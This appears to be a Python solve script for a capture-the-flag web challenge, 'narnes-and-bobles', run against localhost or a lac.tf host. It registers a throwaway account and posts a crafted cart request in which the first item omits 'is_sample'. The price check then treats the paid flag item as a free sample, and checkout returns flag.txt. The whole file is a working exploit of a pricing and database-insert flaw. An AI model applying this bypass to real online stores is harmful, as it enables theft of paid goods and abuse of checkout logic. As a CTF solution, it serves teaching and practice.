import requests
import os
import io
import zipfile

base = "http://localhost:3000"
# base = "https://narnes-and-bobles.chall.lac.tf/"
url = lambda end: f"{base.rstrip('/')}{end}"

ao3_id = "509d8c2a80e495fb"
flag_id = "2a16e349fb9045fa"

s = requests.Session()

username = "user_" + os.urandom(8).hex()
password = "password_" + os.urandom(8).hex()

r = s.post(url("/register"), data={"username": username, "password": password})
assert "session" in s.cookies, "failed login ig"

print("Registered user", username, password)

# omit is_sample from the first item in array causes the VALUES expansion
# to only insert the columns in the first object
#
# this results in the price calculations using is_sample from the request (true => flag = $0)
# while the flag without is_sample gets added to the real table and checkout
r = s.post(url("/cart/add"), json={
    "products": [
        { "book_id": ao3_id },
        { "book_id": flag_id, "is_sample": True },
    ]
})
print("Add to cart", r, r.json())

r = s.post(url("/cart/checkout"))
print("Checkout from cart", r)

with zipfile.ZipFile(io.BytesIO(r.content)) as z:
    print(z.read("flag.txt"))
